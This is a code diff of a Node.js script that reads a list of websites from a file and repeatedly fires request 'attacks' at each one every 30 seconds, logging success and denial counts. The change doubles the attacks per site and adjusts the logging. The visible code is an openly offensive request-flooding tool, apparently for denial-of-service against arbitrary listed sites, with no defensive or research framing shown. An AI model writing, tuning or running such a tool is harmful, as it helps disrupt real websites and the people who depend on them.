@@ -1,6 +1,7 @@
 const SITES_FILE = 'urls.txt'; // file with sites list
-const ATTACK_COUNT = 5; // number of attacks per site
+const ATTACK_COUNT = 10; // number of attacks per site
 const DELAY_BETWEEN_ATTACK = 30000; // ms 60000 = 1min
+const SUCCESS_MESSAGE = true; // show success message
 
 const request = require('request');
 const fs = require('fs');
@@ -27,8 +28,7 @@ async function updateUrls() {
   });
 
   for await (const line of rl) {
-	if(!line.includes('!') )urls.push(line);
-	
+    if (!line.includes('!')) urls.push(line);
   }
 }
 
@@ -41,14 +41,18 @@ function bodyRequest(err, res, body) {
   const { url, testAttack } = this;
   try {
     if (err) throw err;
-    console.log(
-      //`Site ${url} has been attacked, attack status: ${attackStatus} code: ${res.statusCode}`
-	`${attackStatus} ${testAttack ? 'try ' : ''}attack ${url} code: ${res.statusCode}`    
-);
+    if (SUCCESS_MESSAGE) {
+      console.log(
+        `${attackStatus} ${testAttack ? 'try ' : ''}attack ${url} code: ${
+          res.statusCode
+        }`
+      );
+    }
   } catch (e) {
     console.log(
-      `${attackStatus} ${testAttack ? 'try ' : ''}attack ${url} error code: ${e.errno}`
-      //`Site ${url} has been attacked, attack status: ${attackStatus}, error code: ${e.errno}`
+      `${attackStatus} ${testAttack ? 'try ' : ''}attack ${url} error code: ${
+        e.errno
+      }`
     );
   }
   if (attackStatus === 'Success' && testAttack) {
@@ -62,8 +66,7 @@ async function startAttack() {
     `ATTACK STATISTICS: SUCCESS = ${statistics.success}, DENIED = ${statistics.denied}`
   );
   await updateUrls();
-	console.log(`length = ${urls.length}`)
-	console.log(urls)
+  console.log(`Sites count: ${urls.length}`);
   if (urls.length) for await (const url of urls) attackSite(url, true);
   setTimeout(startAttack, DELAY_BETWEEN_ATTACK);
 }
